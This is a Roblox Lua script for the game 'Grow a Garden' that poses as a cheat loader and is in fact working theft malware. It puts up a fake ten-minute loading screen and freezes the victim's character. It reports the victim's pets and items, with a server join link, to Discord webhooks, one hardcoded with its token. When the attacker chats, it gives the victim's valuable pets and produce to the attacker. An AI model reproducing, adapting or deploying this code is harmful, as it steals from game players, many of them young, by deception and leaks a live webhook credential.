local logs_webhook = "https://discord.com/api/webhooks/1387596413185163294/7OhAXbsCQ__PGPih4oW2F13OQWtrA5RQn2YOBVutXENBDWX0Lem2mcS3n7kYw-p1-l8K"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")

-- LOADING SCREEN
local gui = Instance.new("ScreenGui")
gui.Name = "ScriptLoader"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999 
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
local bg = Instance.new("Frame", gui)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.Size = UDim2.new(1, 0, 1, 0)
local title = Instance.new("TextLabel", bg)
title.Text = "Loading Script..."
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Size = UDim2.new(0.8, 0, 0.12, 0)
title.Position = UDim2.new(0.1, 0, 0.28, 0)
title.BackgroundTransparency = 1
local status = Instance.new("TextLabel", bg)
status.Text = "Initializing..."
status.Font = Enum.Font.Gotham
status.TextColor3 = Color3.fromRGB(180, 180, 180)
status.TextScaled = true
status.Size = UDim2.new(0.8, 0, 0.08, 0)
status.Position = UDim2.new(0.1, 0, 0.42, 0)
status.BackgroundTransparency = 1
local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true
local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBg
local discord = Instance.new("TextLabel", bg)
discord.Text = "MADE BY BUFFY ,ENJOY"
discord.Font = Enum.Font.GothamSemibold
discord.TextColor3 = Color3.fromRGB(120, 120, 255)
discord.TextScaled = true
discord.Size = UDim2.new(0.8, 0, 0.05, 0)
discord.Position = UDim2.new(0.1, 0, 0.86, 0)
discord.BackgroundTransparency = 1

local fakeSteps = {
    "MADE BY BUFFY",
    "Connecting to game servers...",
    "Bypassing anti-cheat...",
    "Loading UI assets...",
    "Injecting main module...",
    "Syncing with server...",
    "Optimizing script performance...",
    "Checking for updates...",
    "Hiding script from detection...",
    "Finalizing setup...",
    "Preparing game environment...",
    "Almost done..."
}
local totalDuration = 600 -- seconds
local stepTime = totalDuration / #fakeSteps
task.spawn(function()
    for i = 1, #fakeSteps do
        status.Text = fakeSteps[i]
        barFill:TweenSize(UDim2.new(i / #fakeSteps, 0, 1, 0), "Out", "Quad", stepTime * 0.75, true)
        task.wait(stepTime)
    end
    gui:Destroy()
end)

-- REST OF SCRIPT

local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
local req = (syn and syn.request) or (http and http.request) or (http_request) or request

local p = LocalPlayer
local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
h.WalkSpeed = 0
h.JumpPower = 0
pcall(function()
	require(p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
end)

local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
local function formatNumber(num)
	if type(num) ~= "number" then return tostring(num) end
	if num < 1000 then return tostring(num) end
	local magnitude = math.floor(math.log10(num) / 3)
	local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
	local scaled = num / (1000 ^ magnitude)
	return string.format("%.2f%s", scaled, suffix)
end

if #Players:GetPlayers() >= 5 then
	LocalPlayer:Kick("Old server detected. Please rejoin!")
	return
end

local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
for _, item in ipairs(backpack:GetChildren()) do
	if item:GetAttribute("d") == true then
		event:FireServer(item)
	end
end

local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

-- Updated PETS and EMOJIS
local allowedPets = {
    ["Raccoon"] = true, ["Disco Bee"] = true, ["Bear Bee"] = true, ["Scarlet Macaw"] = true,
    ["Petal Bee"] = true, ["Mimic Octopus"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true,
    ["Red Fox"] = true, ["Polar Bear"] = true, ["Butterfly"] = true, ["Chicken Zombie"] = true, ["Cooked Owl"] = true,
}
local petEmojis = {
    ["Raccoon"] = "🦝", ["Disco Bee"] = "🐝", ["Bear Bee"] = "🐻", ["Scarlet Macaw"] = "🦜", ["Petal Bee"] = "🌸",
    ["Mimic Octopus"] = "🐙", ["Queen Bee"] = "👑", ["Dragonfly"] = "🐞", ["Red Fox"] = "🦊", ["Polar Bear"] = "🐻‍❄️",
    ["Butterfly"] = "🦋", ["Chicken Zombie"] = "🐔", ["Cooked Owl"] = "🦉",
}
local fruitEmojis = {
	Feijoa = "🟢", Loquat = "🏵️", ["Prickly Pear"] = "🌵", ["Bell Pepper"] = "🫑", Kiwi = "🥝", Pineapple = "🍍",
	Banana = "🍌", Avocado = "🥑", ["Green Apple"] = "🍏", Cauliflower = "⚪", ["Elephant Ears"] = "🐘",
	["Rosy Delight"] = "🌹", ["Parasol Flower"] = "⛱️", Pear = "🍐", Cantaloupe = "🍈", ["Wild Carrot"] = "🥕",
	Carrot = "🥕", Tomato = "🍅", Corn = "🌽", Strawberry = "🍓", Blueberry = "🫐", ["Orange Tulip"] = "🌷",
	Daffodil = "🌼", Raspberry = "🍇", Apple = "🍏", Mushroom = "🍄", Mint = "🌱", Lemon = "🍋", Peach = "🍑",
	Pumpkin = "🎃", Watermelon = "🍉", Cactus = "🌵", Bamboo = "🎋", Coconut = "🥥", Mango = "🥭", 
	["Dragon Fruit"] = "🐉", Grape = "🍇", Passionfruit = "🍈", Papaya = "🧡", ["Cherry Blossom"] = "🌸",
	Glowshroom = "🍄", Nightshade = "🌑", ["Soul Fruit"] = "💀", ["Cursed Fruit"] = "🧟", Lotus = "🪷",
	["Venus Fly Trap"] = "🌱", Moonglow = "🌙", Moonflower = "🌼", ["Moon Mango"] = "🥭", ["Moon Blossom"] = "🌸",
	Celestiberry = "🪐", Starfruit = "🌟", ["Dragon Pepper"] = "🌶️", ["Nectar Thorn"] = "🌿", Cocovine = "🌴",
	Beanstalk = "🫛", Cacao = "🫘", Pepper = "🌶️", ["Blood Banana"] = "🍌", ["Moon Melon"] = "🍈",
	["Candy Blossom"] = "🍬", ["Candy Sunflower"] = "🌻", ["Red Lollipop"] = "🍭", ["Chocolate Carrot"] = "🍫",
	["Easter Egg"] = "🥚", Nectarine = "🍑", ["Sugar Apple"] = "🍏", Suncoil = "☀️", ["Violet Corn"] = "🌽",
	["Bee Balm"] = "🐝", Succulent = "🌵", Crocus = "🌸", Eggplant = "🍆", Durian = "🥥", Sunflower = "🌻",
	Lilac = "🪻", ["Ember lily"] = "🔥🌺"
}
local knownFruits = {}
for fruitName, _ in pairs(fruitEmojis) do
	knownFruits[fruitName] = true
end
local function withEmoji(name, emojiTable)
	return (emojiTable[name] or "").." "..name
end

local function getKg(name)
	return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
end

local function gatherInventorySummary()
	local petCountMap = {}
	local petLines = {}
	local itemsWithValue = {}

	for _, item in pairs(backpack:GetChildren()) do
		local baseName = item.Name:match("^(.-)%s*%[") or item.Name
		if allowedPets[baseName] then
			petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
		elseif item:FindFirstChild("Item_String") then
			local value = CalculatePlantValue(item)
			table.insert(itemsWithValue, {name = baseName, value = value})
		end
	end

	for petName, count in pairs(petCountMap) do
		table.insert(petLines, withEmoji(petName, petEmojis) .. " - pet (x" .. count .. ")")
	end

	table.sort(itemsWithValue, function(a, b) return a.value > b.value end)

	local tradableSummary = ""
	local totalShown = 0

	for _, line in ipairs(petLines) do
		if totalShown >= 10 then break end
		tradableSummary = tradableSummary .. line .. "\n"
		totalShown += 1
	end

	for i = 1, math.min(10 - totalShown, #itemsWithValue) do
		local item = itemsWithValue[i]
		tradableSummary = tradableSummary .. withEmoji(item.name, fruitEmojis) .. " - Worth: " .. formatNumber(item.value) .. "\n"
	end

	if #petLines + #itemsWithValue > 10 then
		tradableSummary = tradableSummary .. "and more..."
	end

	local totalValue = 0
	for _, item in ipairs(itemsWithValue) do
		totalValue += item.value
	end

	return tradableSummary, totalValue
end

local function sendWebhook()
	local tradableSummary, totalValue = gatherInventorySummary()

	local payload = {
		["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
		["embeds"] = {{
			["title"] = ":skull: GROW A GARDEN Stealer",
			["color"] = 0x00ffcc,
			["fields"] = {
				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
				{["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
			},
			["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local logs_payload = {
		["embeds"] = {{
			["title"] = ":skull: GROW A GARDEN LOGS",
			["color"] = 0x00ffcc,
			["fields"] = {
				{["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
				{["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
				{["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
				{["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
				{["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
			},
			["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	if req then
		pcall(function()
			req({
				Url = webhook,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode(payload)
			})

			req({
				Url = logs_webhook,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode(logs_payload)
			})
		end)
	end
end

local function unequipAllPets()
	local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
	if petData then
		for uuid, _ in pairs(petData.PetInventory.Data) do
			ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
			task.wait(0.1)
		end
	end
end

local function waitForPrompt(targetChar)
	for _ = 1, 50 do
		for _, obj in ipairs(targetChar:GetDescendants()) do
			if obj:IsA("ProximityPrompt") and obj.Enabled and obj.HoldDuration then
				return obj
			end
		end
		task.wait(0.1)
	end
end

local function holdPrompt(prompt)
	pcall(function()
		prompt:InputHoldBegin(Enum.UserInputType.Touch)
		task.wait(prompt.HoldDuration + 0.1)
		prompt:InputHoldEnd(Enum.UserInputType.Touch)
	end)
end

-- Gifting in custom order
local petGiveOrder = {
    "Raccoon",
    "Disco Bee",
    "Mimic Octopus",
    "Dragonfly",
    "Queen Bee",
    "Scarlet Macaw",
    "Butterfly",
    "Red Fox",
    "Chicken Zombie",
    "Polar Bear",
    "Petal Bee",
    "Bear Bee",
    "Cooked Owl"
}
local started = false

local function startGiving()
	local target = Players:FindFirstChild(username)
	if not target or not target.Character or not LocalPlayer.Character then return end

	local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
	if not myHRP or not targetHRP then return end

	myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 2, 0)
	task.wait(0.4)

	-- Gifting pets in order
	for _, petName in ipairs(petGiveOrder) do
		for _, tool in ipairs(backpack:GetChildren()) do
			if tool:IsA("Tool") then
				local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
				if baseName == petName then
					tool.Parent = LocalPlayer.Character
					task.wait(0.25)
					local prompt = waitForPrompt(target.Character)
					if prompt then
						holdPrompt(prompt)
					end
					task.wait(0.15)
					if tool:IsDescendantOf(LocalPlayer.Character) then
						tool.Parent = backpack
					end
					break -- move to next pet in order
				end
			end
		end
	end

	-- Gifting other items (not pets)
	while true do
		local tools = {}
		for _, tool in ipairs(backpack:GetChildren()) do
			local baseName = tool.Name:match("^(.-)%s*%[") or tool.Name
			if tool:IsA("Tool") and not allowedPets[baseName] and getKg(tool.Name) > 0 then
				table.insert(tools, tool)
			end
		end
		table.sort(tools, function(a, b)
			return getKg(a.Name) > getKg(b.Name)
		end)
		if #tools == 0 then break end
		for _, tool in ipairs(tools) do
			if tool.Parent == backpack then
				tool.Parent = LocalPlayer.Character
				task.wait(0.25)
				local prompt = waitForPrompt(target.Character)
				if prompt then
					holdPrompt(prompt)
				end
				task.wait(0.15)
				if tool:IsDescendantOf(LocalPlayer.Character) then
					tool.Parent = backpack
				end
			end
		end
		task.wait(0.1)
	end
end

unequipAllPets()
task.wait(1)
sendWebhook()

for _, p in ipairs(Players:GetPlayers()) do
	if p.Name == username then
		p.Chatted:Connect(function()
			if not started then
				started = true
				startGiving()
			end
		end)
	end
end

Players.PlayerAdded:Connect(function(p)
	if p.Name == username then
		p.Chatted:Connect(function()
			if not started then
				started = true
				startGiving()
			end
		end)
	end
end)
